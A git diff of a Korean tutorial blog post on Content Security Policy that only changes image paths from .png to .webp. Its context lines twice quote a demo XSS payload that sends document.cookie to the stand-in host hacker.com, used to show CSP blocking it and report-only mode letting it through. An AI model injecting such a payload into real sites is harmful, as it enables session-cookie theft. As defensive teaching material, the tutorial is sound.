@@ -16,7 +16,7 @@ tags:
     보안 가이드,
   ]
 category: HTTP
-image: '/images/http-content-security-policy/thumbnail.png'
+image: '/images/http-content-security-policy/thumbnail.webp'
 ---
 
 import Highlight from '@/components/mdx/Highlight'
@@ -25,7 +25,7 @@ import Highlight from '@/components/mdx/Highlight'
 
 `Content Security Policy(CSP)`는 **크로스 사이트 스크립팅(XSS) 공격을 방어하기 위한 웹 보안 메커니즘**입니다.
 
-![Content Security Policy](/images/http-content-security-policy/thumbnail.png)
+![Content Security Policy](/images/http-content-security-policy/thumbnail.webp)
 
 크로스 사이트 스크립팅을 기반으로 하는 보안 공격 기법들의 공통점은 출처를 알 수 없는 자바스크립트를 브라우저가 실행한다는 점입니다.
 
@@ -49,7 +49,7 @@ res.setHeader('Content-Security-Policy', "default-src 'self'");
 
 따라서 위 설정은 브라우저가 **현재 출처의 자원만 사용하라는 기본값**을 명시한 것입니다.
 
-![실제로, 서버에서 페이지를 불러올 때 Content-Security-Policy 헤더를 확인할 수 있다.](/images/http-content-security-policy/1.png)
+![실제로, 서버에서 페이지를 불러올 때 Content-Security-Policy 헤더를 확인할 수 있다.](/images/http-content-security-policy/1.webp)
 
 ---
 
@@ -67,13 +67,13 @@ res.setHeader('Content-Security-Policy', "default-src 'self'");
 <script>fetch(`http://hacker.com:8081?cookie=${document.cookie}`)</script>
 ```
 
-![악성 스크립트 입력](/images/http-content-security-policy/2.png)
+![악성 스크립트 입력](/images/http-content-security-policy/2.webp)
 
 ## CSP 차단 결과 분석
 
 네트워크 탭을 확인하면 `hacker.com`으로 네트워크 요청이 발생하지 않은 것을 확인할 수 있습니다:
 
-![네트워크 요청이 발생하지 않음](/images/http-content-security-policy/3.png)
+![네트워크 요청이 발생하지 않음](/images/http-content-security-policy/3.webp)
 
 브라우저 콘솔에는 **Content Security Policy** 경고가 표시됩니다. "다음 지시자를 위반했기 때문에 인라인 스크립트가 실행되지 않도록 차단했습니다"라는 메시지를 볼 수 있습니다. 이는 브라우저가 CSP 정책을 올바르게 이행한 것입니다.
 
@@ -81,11 +81,11 @@ res.setHeader('Content-Security-Policy', "default-src 'self'");
 
 흥미로운 점은 인라인 스타일도 차단된다는 것입니다:
 
-![인라인 스타일이 적용되지 않도록 차단했습니다](/images/http-content-security-policy/4.png)
+![인라인 스타일이 적용되지 않도록 차단했습니다](/images/http-content-security-policy/4.webp)
 
 실제로 우리 문서에 있는 인라인 스타일(`width:600px`)도 제대로 적용되지 않습니다:
 
-![width:600px이 있지만, 제대로 적용이 안되어 있을 것이다.](/images/http-content-security-policy/5.png)
+![width:600px이 있지만, 제대로 적용이 안되어 있을 것이다.](/images/http-content-security-policy/5.webp)
 
 CSP는 인라인 스크립트뿐만 아니라 **인라인 스타일까지 차단**하여 보안을 강화합니다.
 
@@ -217,7 +217,7 @@ server.listen(8080, () => {
 
 사이트에 접속하면 즉시 `/report` 경로로 리포트가 전달됩니다:
 
-![/report 경로로 리포트가 전달됨](/images/http-content-security-policy/6.png)
+![/report 경로로 리포트가 전달됨](/images/http-content-security-policy/6.webp)
 
 ### 리포트 내용 분석
 
@@ -225,7 +225,7 @@ server.listen(8080, () => {
 
 서버 콘솔에서도 CSP 리포트를 확인할 수 있습니다:
 
-![서버에서 보고서를 받아볼 수 있다.](/images/http-content-security-policy/7.png)
+![서버에서 보고서를 받아볼 수 있다.](/images/http-content-security-policy/7.webp)
 
 ### Report-Only vs 일반 CSP의 차이
 
@@ -242,13 +242,13 @@ Report-Only 모드에서는 인라인 스타일도 정상 동작하고, 심지�
 <script>fetch(`http://hacker.com:8081?cookie=${document.cookie}`)</script>
 ```
 
-![스크립트가 주입이 됨을 확인할 수 있음 CSP가 진단만 하기 때문](/images/http-content-security-policy/8.png)
+![스크립트가 주입이 됨을 확인할 수 있음 CSP가 진단만 하기 때문](/images/http-content-security-policy/8.webp)
 
 입력하면 `hacker.com`에 쿠키 값이 **실제로 유출**됩니다. Report-Only 모드는 진단만 하고 스크립트 실행은 허용하기 때문입니다.
 
 대신 이런 보안 위반 사항들이 서버로 리포트됩니다:
 
-![서버에 쿠키 관련 리포트가 보고됨](/images/http-content-security-policy/9.png)
+![서버에 쿠키 관련 리포트가 보고됨](/images/http-content-security-policy/9.webp)
 
 ---
 
@@ -260,11 +260,11 @@ CSP가 현업에서 어떻게 활용되는지 Google의 사례를 살펴보겠�
 
 Google 문서를 요청하면 응답 헤더에 CSP 관련 헤더가 포함되어 있습니다:
 
-![구글의 CSP 사례](/images/http-content-security-policy/10.png)
+![구글의 CSP 사례](/images/http-content-security-policy/10.webp)
 
 Google은 **Report-Only 모드**를 사용하여 진단만 하고 리소스 로딩은 허용합니다:
 
-![구글의 CSP 리포트 보고서](/images/http-content-security-policy/11.png)
+![구글의 CSP 리포트 보고서](/images/http-content-security-policy/11.webp)
 
 ### Google의 접근 방식 분석
 
